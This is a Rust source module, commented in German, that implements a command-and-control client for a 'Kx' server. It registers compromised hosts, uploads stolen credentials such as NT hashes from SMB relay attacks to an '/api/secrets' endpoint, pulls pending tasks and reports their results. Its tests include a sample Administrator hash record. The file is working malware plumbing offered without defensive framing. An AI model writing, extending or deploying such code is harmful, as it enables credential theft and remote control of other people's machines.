//! C2-Kommunikation: Client für den Kx-Server.
//!
//! Der Transport des Protokolls liegt in `kx_core::c2::transport` — dort
//! stehen TLS-Aufbau, Bearer-Header, URL-Bildung und die Abbildung eines
//! HTTP-Status auf einen Fehler. Dieses Modul ist ein dünner Adapter: es
//! bindet die Pfade und die Typen des Protokolls an den Transport.
//!
//! Die Nachrichten selbst sind nicht hier definiert, sondern in
//! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.

use kx_core::c2::transport::{Transport, TransportError};
use kx_core::c2::{
    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_RESULT,
};

/// C2-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
pub struct C2Client {
    transport: Transport,
}

impl C2Client {
    /// Erzeugt einen Client für den angegebenen Server.
    ///
    /// `server_cert`: PEM-Pfad zum Server-Zertifikat (vertraut gemacht).
    pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError> {
        Ok(Self {
            transport: Transport::from_cert_file(server, token, server_cert)?,
        })
    }

    /// Registriert einen Host unter `/api/register`.
    pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
        self.transport.post_json(PATH_REGISTER, req)
    }

    /// Lädt ein Secret unter `/api/secrets` hoch. Die Ziel-Host-Kennung steht im
    /// Upload selbst — sie kann nicht mehr auseinanderlaufen.
    pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), TransportError> {
        self.transport.post_json(PATH_SECRETS, upload)
    }

    /// Holt die offenen Tasks unter `/api/tasks`.
    ///
    /// Der Agent filtert selbst nach seiner eigenen Host-Kennung und dem
    /// Status `pending` — der Server kennt keinen Auftrag, der nur für einen
    /// bestimmten Agenten bestimmt ist.
    pub async fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError> {
        self.transport.get_json(PATH_TASKS)
    }

    /// Meldet das Ergebnis eines ausgeführten Tasks unter
    /// `/api/tasks/result` zurück.
    pub async fn report_task_result(
        &self,
        report: &TaskResultRequest,
    ) -> Result<(), TransportError> {
        self.transport.post_json(PATH_TASKS_RESULT, report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn register_request_serializes_host_id() {
        let req = RegisterRequest {
            host_id: "192.168.1.5".into(),
            ip: "192.168.1.5".into(),
            hostname: Some("srv1".into()),
            os: Some("Windows".into()),
            status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
            sealed_master: None,
            master_key: None,
        };
        let v = serde_json::to_value(&req).unwrap();
        assert_eq!(v["ip"], "192.168.1.5");
        assert_eq!(v["host_id"], "192.168.1.5");
    }

    /// Der Upload trägt die Ziel-Host-Kennung selbst — es gibt keine zweite
    /// Stelle mehr, an der sie auseinanderlaufen könnte.
    #[test]
    fn secret_upload_carries_its_host_id() {
        let upload = SecretUpload {
            host_id: "192.168.1.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: Some("smb_relay".into()),
            master_key: None,
            sealed_password: None,
        };
        let v = serde_json::to_value(&upload).unwrap();
        assert_eq!(v["host_id"], "192.168.1.5");
        assert_eq!(v["source"], "smb_relay");
    }

    #[test]
    fn client_uses_the_contract_paths() {
        assert_eq!(PATH_REGISTER, "/api/register");
        assert_eq!(PATH_SECRETS, "/api/secrets");
        assert_eq!(PATH_TASKS, "/api/tasks");
        assert_eq!(PATH_TASKS_RESULT, "/api/tasks/result");
    }
}
